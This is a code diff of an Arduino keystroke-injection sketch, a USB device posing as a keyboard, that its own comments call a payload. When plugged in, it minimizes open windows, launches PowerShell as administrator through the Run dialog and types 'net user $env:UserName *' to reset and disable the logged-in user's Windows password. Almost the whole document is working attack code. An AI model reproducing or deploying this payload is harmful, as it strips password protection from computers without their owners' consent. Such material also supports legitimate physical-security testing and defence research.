@@ -14,12 +14,14 @@ void setup()
   Keyboard.begin();
 
   delay(500);
+  
+  // Minimize all apps
 
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('d');
   Keyboard.releaseAll();
 
-  // Désactiver le mot de passe windows
+  // Start powershell as admin
 
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
@@ -36,7 +38,7 @@ void setup()
   Keyboard.press(KEY_RETURN);
   Keyboard.releaseAll();
 
-  delay(1000);
+  delay(2000);
 
   Keyboard.press(KEY_LEFT_ARROW);
   Keyboard.releaseAll();
@@ -46,49 +48,20 @@ void setup()
   typeKey(KEY_RETURN);
 
   delay(500);
-
-  Keyboard.print("$env:UserName ");
   
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.press('-');
-  Keyboard.releaseAll();
-   
-  Keyboard.print(" clip");
+  // Disable windows password
 
-  typeKey(KEY_RETURN);
-
-  delay(500);
-
-  Keyboard.print("net user ");
-
-  Keyboard.press(KEY_LEFT_CTRL);
-  Keyboard.press('v');
-  Keyboard.releaseAll();
-
-  delay(150);
-
-  typeKey(KEY_BACKSPACE);
-
-  Keyboard.print(" *");
+  Keyboard.print("net user $env:UserName *");
 
   typeKey(KEY_RETURN);
 
   delay(150);
-
-  typeKey(KEY_RETURN);
-
-  delay(100);
-  
-  typeKey(KEY_RETURN);
-
-  delay(100);
 
   Keyboard.print("exit");
 
   typeKey(KEY_RETURN);
 
-  // End Payload
+  // End of Payload
 
   // Stop Keyboard and Mouse
   Keyboard.end();
